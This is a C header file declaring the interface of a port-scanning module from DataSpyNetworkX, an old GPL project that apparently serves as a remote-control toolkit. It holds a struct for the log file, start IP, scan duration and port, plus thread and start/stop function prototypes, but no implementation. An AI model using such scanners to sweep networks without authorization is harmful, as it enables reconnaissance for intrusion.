/* /* 
	DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
	Release Source 0.4Beta.

	In no event will the author be held liable for any damages arising from the use of this code. 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#ifndef _portscan_h_inc
#define _portscan_h_inc

extern BOOL gbPSCAN;
extern DWORD g_dwPortScanTID;
extern HANDLE g_hPortScanThread;

struct PScan 
{
	char *clogfile; //File log successful to
	long startip;	//Start ip (ntohl(inet_addr("126.255.224.1"));)
	int seconds;	//Or, time to scan for
	int port;		//port to scan on

};

DWORD WINAPI PortScanThread(LPVOID lpArgs);
BOOL StartPortScan(PScan *scanner);
BOOL StopPortScanning();
#endif //_portscan_h_inc
